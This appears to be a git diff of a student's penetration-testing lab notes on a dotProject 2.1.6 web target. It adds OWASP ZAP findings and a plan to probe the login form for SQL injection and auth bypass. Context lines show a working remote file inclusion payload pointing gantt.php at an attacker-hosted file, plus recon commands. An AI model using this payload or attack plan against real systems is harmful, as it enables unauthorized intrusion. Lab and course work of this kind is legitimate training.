@@ -21,8 +21,11 @@ Summaries below match the Nessus notes in [../README.md](../README.md#nessus--my
 | **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
 | **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
 | **Confirmed primitive** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — response body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004` evidence](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)) |
+| **OWASP ZAP (baseline)** | **Active scan:** **Parameter Tampering** on **`login`** at **`/dotproject/index.php`** (Medium — error-style output / **CWE-472**). **Passive + active:** **X-Frame-Options** missing (clickjacking), weak **cookie** flags, no **Anti-CSRF** on forms, **`X-Powered-By`** leak, **`X-Content-Type-Options`** missing, **timestamp** disclosures — see [`102-005`](../Screenshots/102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png), [`102-006`](../Screenshots/102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png). |
 
 **Lanes that did not pan out:** Shellshock (**MSF `check`** negative), **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** rows, RFI **listener / path** mistakes — full notes and screenshots: **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)**.
+
+**Plan shift after ZAP:** keep **RFI** as the proven lane; add **time-boxed** manual follow-up on **`login`** (**SQLi** / **auth bypass** / **logic flaws**) using ZAP evidence as the map; treat **clickjacking** / **cookie** / **CSRF** items as **defense-in-depth** findings for the report unless the rubric rewards chained client-side impact.
 
 ### Plan of attack — commands (current)
 
@@ -47,11 +50,16 @@ curl -sik "http://$RHOST_102/dotproject/"
 curl -sik "http://$RHOST_102/dotproject/index.php"
 ```
 
-**3 — Optional scanner**
+**3 — Optional web scanners**
 
 ```bash
 nikto -h "http://$RHOST_102"
 ```
+
+**OWASP ZAP** (scope **`http://$RHOST_102/dotproject/`** — Quick Start / spider, then **active scan**; proxy listen e.g. **`localhost:8081`** if you avoid colliding with **`8080`** RFI PoC):
+
+- Review **Alerts** — prioritize **Medium** **Parameter Tampering** on **`login`** (manual: **SQLi**, type juggling, auth bypass) before burning time on **Low** header-only rows.
+- **X-Frame-Options** / **CSRF** / **cookie flags** — document for **remediation**; exploit only if course **ROE** rewards **session** impact and you have a **clear chain**.
 
 **4 — Exploit-DB + RFI proof (lab-authorized)**
 
@@ -95,7 +103,8 @@ find / -name "proof.txt" 2>/dev/null
 | curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
 | Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
 | Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png` |
-| Chronological **102-*** | `102-001_curl_gantt_si_200_tm6_afrocha.png` … `102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` (see also `102-002`, `102-003` in repo) |
+| Chronological **102-*** | `102-001_curl_gantt_si_200_tm6_afrocha.png` … `102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` (`102-002`, `102-003`); **`102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png`**, **`102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png`** (ZAP) |
+| OWASP ZAP | `102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png` (Parameter Tampering **`login`**), `102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png` (headers / alert summary) |
 | Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
 | MSF Shellshock `check` | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` |
 | searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |
@@ -259,7 +268,7 @@ C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
 
 ## Ordering suggestion (one operator on KALI6)
 
-1. **.102** — **dotProject RFI / web** first (validated path); Shellshock and generic MSF noise archived under [`unfruitful_attempts/`](unfruitful_attempts/README.md).  
+1. **.102** — **dotProject RFI / web** first (validated path); **ZAP** flags **`login`** parameter tampering → time-box **SQLi / auth** follow-up; Shellshock and generic MSF noise archived under [`unfruitful_attempts/`](unfruitful_attempts/README.md).  
 2. **.100** — **XP/SMB** classics; do while you have Metasploit workspace warm.  
 3. **.101** — **Win7** harder target; use creds or results from **.100** lateral moves if the scenario allows.
 
